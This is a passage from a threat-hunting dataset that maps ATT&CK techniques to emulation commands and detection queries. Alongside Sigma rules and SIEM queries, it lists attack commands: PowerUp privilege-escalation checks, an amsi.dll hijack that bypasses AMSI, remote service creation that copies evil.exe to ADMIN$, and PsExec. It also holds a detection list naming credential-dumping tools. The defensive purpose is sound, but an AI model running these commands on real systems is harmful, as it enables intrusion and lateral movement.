https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/\ntags:\n    - attack.privilege_escalation\n    - attack.t1058\nstatus: experimental\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        IntegrityLevel: 'Medium'\n        TargetObject|contains: '\\services\\'\n        TargetObject|endswith:\n            - '\\ImagePath'\n            - '\\FailureCommand'\n            - '\\Parameters\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                      # http://bit.ly/314zc6x\n    - EN_0003_enrich_other_sysmon_events_with_event_id_1_data   # http://bit.ly/2ojW7fw", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible privilege escalation via service registry permissions weakness\nid: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981\ndescription: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/\ntags:\n    - attack.privilege_escalation\n    - attack.t1058\nstatus: experimental\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        IntegrityLevel: 'Medium'\n        TargetObject|contains: '\\services\\'\n        TargetObject|endswith:\n            - '\\ImagePath'\n            - '\\FailureCommand'\n            - '\\Parameters\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                      # http://bit.ly/314zc6x\n    - EN_0003_enrich_other_sysmon_events_with_event_id_1_data   # http://bit.ly/2ojW7fw", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND IntegrityLevel:\"Medium\" AND TargetObject.keyword:*\\\\\\\\services\\\\* AND TargetObject.keyword:(*\\\\\\\\ImagePath OR *\\\\\\\\FailureCommand OR *\\\\\\\\Parameters\\\\\\\\ServiceDll))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-privilege-escalation-via-service-registry-permissions-weakness <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible privilege escalation via service registry permissions weakness\",\\n    \"description\": \"Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1058\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND IntegrityLevel:\\\\\"Medium\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\services\\\\\\\\* AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\ImagePath OR *\\\\\\\\\\\\\\\\FailureCommand OR *\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\ServiceDll))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND IntegrityLevel:\\\\\"Medium\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\services\\\\\\\\* AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\ImagePath OR *\\\\\\\\\\\\\\\\FailureCommand OR *\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\ServiceDll))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible privilege escalation via service registry permissions weakness\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND IntegrityLevel:\"Medium\" AND TargetObject.keyword:*\\\\\\\\services\\\\* AND TargetObject.keyword:(*\\\\\\\\ImagePath *\\\\\\\\FailureCommand *\\\\\\\\Parameters\\\\\\\\ServiceDll))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" IntegrityLevel=\"Medium\" TargetObject=\"*\\\\\\\\services\\\\*\" (TargetObject=\"*\\\\\\\\ImagePath\" OR TargetObject=\"*\\\\\\\\FailureCommand\" OR TargetObject=\"*\\\\\\\\Parameters\\\\\\\\ServiceDll\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" IntegrityLevel=\"Medium\" TargetObject=\"*\\\\\\\\services\\\\*\" TargetObject IN [\"*\\\\\\\\ImagePath\", \"*\\\\\\\\FailureCommand\", \"*\\\\\\\\Parameters\\\\\\\\ServiceDll\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*Medium)(?=.*.*\\\\services\\\\.*)(?=.*(?:.*.*\\\\ImagePath|.*.*\\\\FailureCommand|.*.*\\\\Parameters\\\\ServiceDll)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "atomics/T1038/T1038.yaml", "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/find_dllhijack", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/find_dllhijack", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/write_dllhijacker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/write_dllhijacker", "name": "Empire Module Command"}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "powershell/privesc/powerup/find_dllhijack", "powershell/privesc/powerup/find_dllhijack", "powershell/privesc/powerup/write_dllhijacker", "powershell/privesc/powerup/write_dllhijacker"], "technique_id": "T1038", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1038", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.", "Metasploit": "exploit/windows/local/trusted_service_path"}}, {"Atomic Red Team Test - DLL Search Order Hijacking": {"display_name": "DLL Search Order Hijacking", "atomic_tests": [{"description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version\nof amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n", "supported_platforms": ["windows"], "name": "DLL Search Order Hijacking - amsi.dll", "executor": {"elevation_required": true, "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "name": "command_prompt", "cleanup_command": "del %APPDATA%\\updater.exe >nul 2>&1\ndel %APPDATA%\\amsi.dll >nul 2>&1\n"}}], "attack_technique": "T1038"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1038", "Empire Module": "powershell/privesc/powerup/find_dllhijack", "Technique": "DLL Search Order Hijacking", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/find_dllhijack\":  [\"T1038\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1038", "Empire Module": "powershell/privesc/powerup/write_dllhijacker", "Technique": "DLL Search Order Hijacking", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/write_dllhijacker\":  [\"T1038\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "name": "Cobalt Strike"}, {"source": "atomics/T1035/T1035.yaml", "command": "sc.exe create ARTService binPath= #{executable_command}\nsc.exe start ARTService\nsc.exe delete ARTService\n", "name": null}, {"source": "atomics/T1035/T1035.yaml", "command": "sc.exe create ARTService binPath= %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\nsc.exe start ARTService\nsc.exe delete ARTService\n", "name": null}, {"source": "atomics/T1035/T1035.yaml", "command": "#{psexec_exe} \\\\localhost \"C:\\Windows\\System32\\calc.exe\"\n", "name": null}, {"source": "atomics/T1035/T1035.yaml", "command": "C:\\PSTools\\PsExec.exe \\\\localhost \"C:\\Windows\\System32\\calc.exe\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "!=wininit", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "services.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "pcalua.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - Service Execution", "command": "start|create|query|config\\\\Windows\\\\.+\\\\sc.exe", "name": null}, {"source": "SysmonHunter - Service Execution", "command": "\\SYSTEM\\CurrentControlSet\\services", "name": null}, {"source": "SysmonHunter - Service Execution", "command": "\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe\\SYSTEM\\CurrentControlSet\\services", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psexec", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psexec", "name": "Empire Module Command"}], "command_list": ["Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "sc.exe create ARTService binPath= #{executable_command}\nsc.exe start ARTService\nsc.exe delete ARTService\n", "sc.exe create ARTService binPath= %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\nsc.exe start ARTService\nsc.exe delete ARTService\n", "#{psexec_exe} \\\\localhost \"C:\\Windows\\System32\\calc.exe\"\n", "C:\\PSTools\\PsExec.exe \\\\localhost \"C:\\Windows\\System32\\calc.exe\"\n", "!=wininit", "services.exe", "*.exe", "pcalua.exe", "start|create|query|config\\\\Windows\\\\.+\\\\sc.exe", "\\SYSTEM\\CurrentControlSet\\services", "\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe\\SYSTEM\\CurrentControlSet\\services", "powershell/lateral_movement/invoke_psexec", "powershell/lateral_movement/invoke_psexec"], "technique_id": "T1035", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1035", "Built-in Windows Command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Cobalt Strike": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "Description": "This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:\nsc \\\\COMP qc acachsrv\ndir \\\\COMP\\ADMIN$\\acachsrv.exe", "Metasploit": ""}}, {"Atomic Red Team Test - Service Execution": {"display_name": "Service Execution", "atomic_tests": [{"description": "Creates a service specifying an aribrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n", "supported_platforms": ["windows"], "name": "Execute a Command as a Service", "input_arguments": {"service_name": {"default": "ARTService", "type": "string", "description": "Name of service to create"}, "executable_command": {"default": "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt", "type": "string", "description": "Command to execute as a service"}}, "executor": {"elevation_required": true, "command": "sc.exe create #{service_name} binPath= #{executable_command}\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n", "name": "command_prompt"}}, {"dependencies": [{"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"$env:TEMP\\PsTools.zip\"\nExpand-Archive $env:TEMP\\PsTools.zip $env:TEMP\\PsTools -Force\nNew-Item -ItemType Directory (\"#{psexec_exe}\") -Force | Out-Null\nCopy-Item $env:TEMP\\PsTools\\PsExec.exe \"#{psexec_exe}\" -Force\n", "prereq_command": "if (Test-Path \"#{psexec_exe}\"\") { exit 0} else { exit 1}\n"}], "supported_platforms": ["windows"], "name": "Use PsExec to execute a command on a remote host", "executor": {"elevation_required": false, "command": "#{psexec_exe} \\\\#{remote_host} \"C:\\Windows\\System32\\calc.exe\"\n", "name": "powershell"}, "input_arguments": {"remote_host": {"default": "localhost", "type": "string", "description": "Remote hostname or IP address"}, "psexec_exe": {"default": "C:\\PSTools\\PsExec.exe", "type": "string", "description": "Path to PsExec"}}, "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill run a command on a remote host\n"}], "attack_technique": "T1035"}}, {"Threat Hunting Tables": {"mitre_attack": "T1035", "file_value": "", "file_path": "", "parent_process": "!=wininit", "itw_sample": "", "chain_id": "100076", "registry_value": "", "mitre_caption": "service_execution", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "services.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1035", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Sobnot.A", "chain_id": "100124", "registry_value": "", "mitre_caption": "service_execution", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "pcalua.exe", "sub_process_2": ""}}, {"SysmonHunter - T1035": {"phase": "Execution", "query": [{"process": {"cmdline": {"pattern": "start|create|query|config"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\sc.exe", "flag": "regex"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "\\SYSTEM\\CurrentControlSet\\services"}}, "type": "process"}, {"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe", "flag": "regex", "op": "not"}}, "type": "reg", "reg": {"path": {"pattern": "\\SYSTEM\\CurrentControlSet\\services"}}, "op": "and"}], "description": null, "name": "Service Execution", "level": "medium"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1035", "Empire Module": "powershell/lateral_movement/invoke_psexec", "Technique": "Service Execution\u00a0", "ATT&CK Technique #2": "T1077", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_psexec\":  [\"T1035\",\"T1077\"],"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2026879", "Verified": "YES", "Signature": "ET POLICY Possible winexe over SMB - Possible Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2010781", "Verified": "YES", "Signature": "ET POLICY PsExec service created"}}], "queries": [{"query": "title: smbexec.py Service Installation\nid: 52a85084-6989-40c3-8f32-091e12e13f09\ndescription: Detects the use of smbexec.py tool by detecting a specific service installation\nauthor: Omer Faruk Celik\ndate: 2018/03/20\nreferences:\n    - https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/\ntags:\n    - attack.lateral_movement\n    - attack.execution\n    - attack.t1077\n    - attack.t1035\nlogsource:\n    product: windows\n    service: system\ndetection:\n    service_installation:\n        EventID: 7045\n        ServiceName: 'BTOBTO'\n        ServiceFileName: '*\\execute.bat'\n    condition: service_installation\nfields:\n    - ServiceName\n    - ServiceFileName\nfalsepositives:\n    - Penetration Test\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: smbexec.py Service Installation\nid: 52a85084-6989-40c3-8f32-091e12e13f09\ndescription: Detects the use of smbexec.py tool by detecting a specific service installation\nauthor: Omer Faruk Celik\ndate: 2018/03/20\nreferences:\n    - https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/\ntags:\n    - attack.lateral_movement\n    - attack.execution\n    - attack.t1077\n    - attack.t1035\nlogsource:\n    product: windows\n    service: system\ndetection:\n    service_installation:\n        EventID: 7045\n        ServiceName: 'BTOBTO'\n        ServiceFileName: '*\\execute.bat'\n    condition: service_installation\nfields:\n    - ServiceName\n    - ServiceFileName\nfalsepositives:\n    - Penetration Test\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7045\" AND ServiceName:\"BTOBTO\" AND ServiceFileName.keyword:*\\\\\\\\execute.bat)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/smbexec.py-Service-Installation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"smbexec.py Service Installation\",\\n    \"description\": \"Detects the use of smbexec.py tool by detecting a specific service installation\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.execution\",\\n      \"attack.t1077\",\\n      \"attack.t1035\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7045\\\\\" AND ServiceName:\\\\\"BTOBTO\\\\\" AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\execute.bat)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7045\\\\\" AND ServiceName:\\\\\"BTOBTO\\\\\" AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\execute.bat)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'smbexec.py Service Installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n    ServiceName = {{_source.ServiceName}}\\\\nServiceFileName = {{_source.ServiceFileName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7045\" AND ServiceName:\"BTOBTO\" AND ServiceFileName.keyword:*\\\\\\\\execute.bat)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7045\" ServiceName=\"BTOBTO\" ServiceFileName=\"*\\\\\\\\execute.bat\") | table ServiceName,ServiceFileName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"7045\" service=\"BTOBTO\" ServiceFileName=\"*\\\\\\\\execute.bat\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7045)(?=.*BTOBTO)(?=.*.*\\\\execute\\\\.bat))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "action: global\ntitle: Credential dumping tools service execution\ndescription: Detects well-known credential dumping tools execution via service execution events\nauthor: Florian Roth, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\nid: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\ndate: 2017/05/15\nmodified: 2019/11/01\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.execution\n    - attack.t1003\n    - attack.t1035\n    - attack.s0005\ndetection:\n    selection_1:\n        - ServiceName|contains:\n            - 'fgexec'\n            - 'wceservice'\n            - 'wce service'\n            - 'pwdump'\n            - 'gsecdump'\n            - 'cachedump'\n            - 'mimikatz'\n            - 'mimidrv'\n        - ImagePath|contains:\n            - 'fgexec'\n            - 'dumpsvc'\n            - 'cachedump'\n            - 'mimidrv'\n            - 'gsecdump'\n            - 'servpw'\n            - 'pwdump'\n        - ImagePath|re: '((\\\\\\\\.*\\\\.*|.*\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\.(exe|scr|cpl|bat|js|cmd|vbs).*)'\n    condition: selection and selection_1\nfalsepositives:\n    - Legitimate Administrator using credential dumping tool for password recovery\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Credential dumping tools service execution\ndescription: Detects well-known credential dumping tools execution via service execution events\nauthor: Florian Roth, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\nid: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\ndate: 2017/05/15\nmodified: 2019/11/01\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.execution\n    - attack.t1003\n    - attack.t1035\n    - attack.s0005\ndetection:\n    selection_1:\n        - ServiceName|contains:\n            - 'fgexec'\n            - 'wceservice'\n            - 'wce service'\n            - 'pwdump'\n            - 'gsecdump'\n            - 'cachedump'\n            - 'mimikatz'\n            - 'mimidrv'\n        - ImagePath|contains:\n            - 'fgexec'\n            - 'dumpsvc'\n            - 'cachedump'\n            - 'mimidrv'\n            - 'gsecdump'\n            - 'servpw'\n            - 'pwdump'\n        - ImagePath|re: '((\\\\\\\\.*\\\\.*|.*\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\.(exe|scr|cpl|bat|js|cmd|vbs).*)'\n    condition: selection and selection_1\nfalsepositives:\n    - Legitimate Administrator using credential dumping tool for password recovery\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7045\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\.*\\\\\\\\.*|.*\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\\n(EventID:\"6\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\.*\\\\\\\\.*|.*\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\\n(EventID:\"4697\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\.*\\\\\\\\.*|.*\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Credential-dumping-tools-service-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Credential dumping tools service execution\",\\n    \"description\": 